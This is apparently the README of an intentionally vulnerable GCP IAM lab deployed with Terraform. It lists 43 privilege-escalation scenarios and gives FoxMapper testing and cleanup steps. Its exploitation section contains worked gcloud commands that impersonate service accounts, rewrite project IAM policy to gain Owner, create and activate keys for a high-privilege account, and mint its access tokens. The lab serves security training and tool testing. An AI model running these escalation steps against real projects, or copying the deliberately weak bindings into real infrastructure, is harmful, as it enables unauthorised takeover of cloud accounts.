# GCP IAM Vulnerable

Intentionally vulnerable GCP IAM configurations for learning privilege escalation and testing security tools.

## Prerequisites

1. **GCP Project**: An isolated test project with no production resources
2. **gcloud CLI**: Installed and configured
3. **Terraform**: Version 1.0+
4. **Permissions**: Owner or IAM Admin role on the project

## Quick Start

```bash
# Authenticate with GCP
gcloud auth login
gcloud auth application-default login

# Set your project
export PROJECT_ID="your-test-project-id"
gcloud config set project $PROJECT_ID

# Enable Service Usage API (required for Terraform to enable other APIs)
gcloud services enable serviceusage.googleapis.com --project $PROJECT_ID

# Configure your project
cp terraform.tfvars.example terraform.tfvars
# Edit terraform.tfvars and set gcp_project_id to your project ID

# Deploy
terraform init
terraform apply
```

**APIs enabled automatically by Terraform:**
- `iam.googleapis.com` - IAM API
- `cloudresourcemanager.googleapis.com` - Resource Manager API
- `compute.googleapis.com` - Compute Engine API
- `cloudfunctions.googleapis.com` - Cloud Functions API
- `cloudbuild.googleapis.com` - Cloud Build API
- `run.googleapis.com` - Cloud Run API
- `storage.googleapis.com` - Cloud Storage API
- `secretmanager.googleapis.com` - Secret Manager API

## Configuration

Edit `terraform.tfvars`:

```hcl
# Required: Your GCP project ID
gcp_project_id = "your-test-project-id"

# Optional: Region (default: us-central1)
gcp_region = "us-central1"

# Optional: Attacker identity (defaults to current user)
# attacker_member = "user:attacker@example.com"
```

## What Gets Created

### Free Resources (Default)

**43 Privilege Escalation Scenarios** grouped by GCP service:

| # | Scenario | Permission(s) | Cost |
|---|----------|---------------|------|
| **IAM Service Account** | | | |
| 1 | setIamPolicy-project | `resourcemanager.projects.setIamPolicy` | Free |
| 2 | createServiceAccountKey | `iam.serviceAccountKeys.create` | Free |
| 3 | setIamPolicy-serviceAccount | `iam.serviceAccounts.setIamPolicy` | Free |
| 4 | getAccessToken | `iam.serviceAccounts.getAccessToken` | Free |
| 5 | signBlob | `iam.serviceAccounts.signBlob` | Free |
| 6 | signJwt | `iam.serviceAccounts.signJwt` | Free |
| 7 | implicitDelegation | `iam.serviceAccounts.implicitDelegation` | Free |
| 8 | getOpenIdToken | `iam.serviceAccounts.getOpenIdToken` | Free |
| 9 | updateRole | `iam.roles.update` | Free |
| **Compute Engine** | | | |
| 10 | actAs-compute | `actAs` + `compute.instances.create` | ~$0.01/hr |
| 11 | setMetadata-compute | `compute.instances.setMetadata` | Free |
| 12 | osLogin | `compute.instances.osAdminLogin` | Free |
| 13 | setServiceAccount | `compute.instances.setServiceAccount` | Free |
| 14 | instanceTemplates.create | `compute.instanceTemplates.create` | ~$0.01/hr |
| **Cloud Functions** | | | |
| 15 | actAs-cloudfunction | `actAs` + `cloudfunctions.functions.create` | Free tier |
| 16 | updateFunction | `cloudfunctions.functions.update` | Free tier |
| 17 | sourceCodeSet | `cloudfunctions.functions.sourceCodeSet` | Free |
| **Cloud Run** | | | |
| 18 | actAs-cloudrun | `actAs` + `run.services.create` | Free tier |
| 19 | run.services.update | `run.services.update` | Free |
| 20 | run.jobs.create | `run.jobs.create` + `actAs` | Free tier |
| **Cloud Build** | | | |
| 21 | actAs-cloudbuild | `actAs` + `cloudbuild.builds.create` | Free tier |
| 22 | cloudbuild.triggers.create | `cloudbuild.builds.create` via trigger | Free |
| **Storage** | | | |
| 23 | setIamPolicy-bucket | `storage.buckets.setIamPolicy` | Free |
| 24 | storage.objects.create | Write to sensitive bucket | Free |
| **Secret Manager** | | | |
| 25 | secretManager | `secretmanager.versions.access` | Free |
| 26 | secretManager.setIamPolicy | `secretmanager.secrets.setIamPolicy` | Free |
| **Pub/Sub** | | | |
| 27 | setIamPolicy-pubsub | `pubsub.topics.setIamPolicy` | Free |
| **Cloud Scheduler** | | | |
| 28 | cloudScheduler | `cloudscheduler.jobs.create` | Free tier |
| **Deployment Manager** | | | |
| 29 | deploymentManager | `deploymentmanager.deployments.create` | Free |
| **Composer** | | | |
| 30 | composer | `composer.environments.create` | ~$300/mo |
| **Dataflow** | | | |
| 31 | dataflow | `dataflow.jobs.create` | ~$0.05/hr |
| **Dataproc** | | | |
| 32 | dataproc.clusters.create | `dataproc.clusters.create` + `actAs` | ~$0.10/hr |
| 33 | dataproc.jobs.create | `dataproc.jobs.create` | Free |
| **GKE/Kubernetes** | | | |
| 34 | container.clusters.create | `container.clusters.create` + `actAs` | ~$70/mo |
| 35 | container.clusters.getCredentials | Access GKE cluster | Free |
| **Vertex AI / AI Platform** | | | |
| 36 | notebooks.instances.create | `notebooks.instances.create` + `actAs` | ~$25/mo |
| 37 | aiplatform.customJobs.create | `aiplatform.customJobs.create` | Varies |
| **Cloud Workflows** | | | |
| 38 | workflows.workflows.create | `workflows.workflows.create` + `actAs` | Free tier |
| **Eventarc** | | | |
| 39 | eventarc.triggers.create | `eventarc.triggers.create` | Free |
| **BigQuery** | | | |
| 40 | bigquery.datasets.setIamPolicy | `bigquery.datasets.setIamPolicy` | Free |
| **Workload Identity** | | | |
| 41 | workloadIdentityPoolProviders | Federation abuse | Free |
| **Org Policy** | | | |
| 42 | orgpolicy.policy.set | `orgpolicy.policy.set` | Free |
| **Deny Bypass** | | | |
| 43 | explicitDeny-bypass | SA chaining | Free |

> **Note:** "Free" means only IAM resources are created (no cost). Exploitation of some paths may require creating actual resources which incur costs.

**Tool Testing Resources:**
- False Negative tests (should be detected)
- False Positive tests (should not be flagged)

### Non-Free Resources (Optional)

Enable via variables in `terraform.tfvars`:

| Module | Variable | Cost/Hour | Cost/Month | Description |
|--------|----------|-----------|------------|-------------|
| compute | `enable_compute = true` | ~$0.002 | ~$2-3 | VM with privileged SA |
| cloud-functions | `enable_cloud_functions = true` | $0 | Free tier | Function with privileged SA |
| cloud-run | `enable_cloud_run = true` | $0 | Free tier | Service with privileged SA |

**Example - Enable specific modules in `terraform.tfvars`:**
```hcl
gcp_project_id = "your-test-project-id"

# Enable only compute module
enable_compute = true
```

**Example - Enable all optional modules:**
```hcl
gcp_project_id = "your-test-project-id"

# Enable all non-free modules
enable_compute         = true
enable_cloud_functions = true
enable_cloud_run       = true
```

**Or via command line:**
```bash
terraform apply -var="enable_compute=true" -var="enable_cloud_functions=true" -var="enable_cloud_run=true" -var="gcp_project_id=iam-vulnerable-test"
```

## Cost Summary

| Configuration | Cost/Hour | Cost/Month |
|---------------|-----------|------------|
| **Default (43 IAM paths only)** | **$0.00** | **$0** |
| + Compute module (preemptible) | +$0.002 | +$2-3 |
| + Compute module (standard) | +$0.008 | +$6-7 |
| + Cloud Functions (idle) | +$0.00 | Free tier |
| + Cloud Run (idle) | +$0.00 | Free tier |
| **All modules enabled** | ~$0.01 | ~$5-10 |

**Note:** The default deployment creates only IAM resources (service accounts, custom roles, IAM bindings) which are **completely free**. Non-free modules must be explicitly enabled.

## Testing with FoxMapper

```bash
# Create a graph of your vulnerable project
foxmapper gcp graph create --project YOUR_PROJECT_ID

# Find privilege escalation paths
foxmapper gcp argquery --preset privesc --project YOUR_PROJECT_ID

# Find multiple paths
foxmapper gcp argquery --preset privesc --project YOUR_PROJECT_ID --paths 3

# List all admins
foxmapper gcp argquery --preset admin --project YOUR_PROJECT_ID
```

## Cleanup

### Standard Cleanup

```bash
terraform destroy
```

### When Terraform State is Lost

```bash
cd cleanup-scripts

# Preview what will be deleted
./cleanup_iam_vulnerable.sh --project YOUR_PROJECT_ID --dry-run

# Execute cleanup
./cleanup_iam_vulnerable.sh --project YOUR_PROJECT_ID
```

## Security Warning

**These resources are intentionally insecure.** Only deploy in:
- Isolated test projects
- Projects with no sensitive data
- Projects not connected to production systems

## Exploitation Quick Start

This section provides a quick introduction to exploiting the privilege escalation paths. For complete step-by-step instructions for all 43 scenarios, see [EXPLOITATION_GUIDE.md](EXPLOITATION_GUIDE.md).

### How It Works

Each privesc path follows this pattern:
1. **Attacker** (you) can impersonate a **vulnerable service account**
2. The **vulnerable SA** has permissions that allow escalation to a **high-privilege SA**
3. The **high-privilege SA** (`privesc-high-priv-sa@PROJECT.iam.gserviceaccount.com`) has Owner role

### Basic Impersonation

```bash
# Set your project
export PROJECT_ID="your-project-id"

# Method 1: Set impersonation globally
gcloud config set auth/impersonate_service_account SERVICE_ACCOUNT_EMAIL

# Method 2: Per-command impersonation
gcloud COMMAND --impersonate-service-account=SERVICE_ACCOUNT_EMAIL

# Method 3: Generate access token
gcloud auth print-access-token --impersonate-service-account=SERVICE_ACCOUNT_EMAIL
```

### Example: Path 1 - setIamPolicy on Project

```bash
# Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc1-set-iam-policy@$PROJECT_ID.iam.gserviceaccount.com

# Get current IAM policy
gcloud projects get-iam-policy $PROJECT_ID --format=json > policy.json

# Edit policy.json to add yourself as Owner, then apply
gcloud projects set-iam-policy $PROJECT_ID policy.json

# Clear impersonation
gcloud config unset auth/impersonate_service_account
```

### Example: Path 2 - Create Service Account Key

```bash
# Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc2-create-key@$PROJECT_ID.iam.gserviceaccount.com

# Create a key for the high-priv SA
gcloud iam service-accounts keys create key.json \
  --iam-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Activate the stolen key
gcloud config unset auth/impersonate_service_account
gcloud auth activate-service-account --key-file=key.json
```

### Example: Path 4 - getAccessToken

```bash
# Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc4-get-access-token@$PROJECT_ID.iam.gserviceaccount.com

# Generate token for high-priv SA (vulnerable SA has Token Creator role)
gcloud auth print-access-token \
  --impersonate-service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com
```

### Next Steps

See [EXPLOITATION_GUIDE.md](EXPLOITATION_GUIDE.md) for:
- Detailed exploitation steps for all 43 scenarios
- Service-specific attack patterns (Compute, Functions, Run, Build, etc.)
- Quick reference table of all service account emails

## Architecture

```
gcp/
├── main.tf                    # Root configuration
├── variables.tf               # Input variables
├── outputs.tf                 # Output values
├── terraform.tfvars.example   # Example configuration
├── cleanup-scripts/           # Manual cleanup tools
│   ├── CLEANUP_README.md
│   ├── cleanup_iam_vulnerable.sh
│   └── cleanup_iam_vulnerable.py
└── modules/
    ├── free-resources/
    │   ├── privesc-paths/     # 43 privilege escalation paths
    │   │   ├── common.tf      # Shared resources
    │   │   ├── privesc1-*.tf  # Individual paths
    │   │   └── ...
    │   └── tool-testing/      # FN/FP test cases
    └── non-free-resources/
        ├── compute/           # GCE instance
        ├── cloud-functions/   # Cloud Functions
        └── cloud-run/         # Cloud Run service
```

## References

- [Privilege Escalation in GCP](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
- [GCP IAM Roles](https://cloud.google.com/iam/docs/understanding-roles)
- [Service Account Impersonation](https://cloud.google.com/iam/docs/impersonating-service-accounts)
- [FoxMapper Documentation](https://github.com/BishopFox/foxmapper)
